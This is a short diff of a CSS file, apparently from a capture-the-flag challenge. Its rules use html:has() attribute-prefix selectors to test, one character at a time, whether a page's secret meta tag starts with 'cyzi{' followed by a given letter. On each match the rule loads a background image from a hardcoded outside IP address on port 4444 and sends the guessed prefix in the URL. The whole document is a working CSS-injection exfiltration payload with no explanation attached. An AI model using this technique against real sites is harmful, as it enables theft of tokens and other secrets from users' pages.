@@ -8,22 +8,22 @@
     --blue: blue;
 }
 
-html:has(meta[name=secret][content^=a]) {
+html:has(meta[name=secret][content^="cyzi{a"]) {
     background-image: url(http://167.99.47.105:4444?secret=cyzi%7Ba);
 }
 
-html:has(meta[name=secret][content^=b]) {
+html:has(meta[name=secret][content^="cyzi{b"]) {
     background-image: url(http://167.99.47.105:4444?secret=cyzi%7Bb);
 }
 
-html:has(meta[name=secret][content^=c]) {
+html:has(meta[name=secret][content^="cyzi{c"]) {
     background-image: url(http://167.99.47.105:4444?secret=cyzi%7Bc);
 }
 
-html:has(meta[name=secret][content^=d]) {
+html:has(meta[name=secret][content^="cyzi{w"]) {
     background-image: url(http://167.99.47.105:4444?secret=cyzi%7Bw);
 }
 
-html:has(meta[name=secret][content^=n]) {
+html:has(meta[name=secret][content^="cyzi{x"]) {
     background-image: url(http://167.99.47.105:4444?secret=cyzi%7Bx);
 }
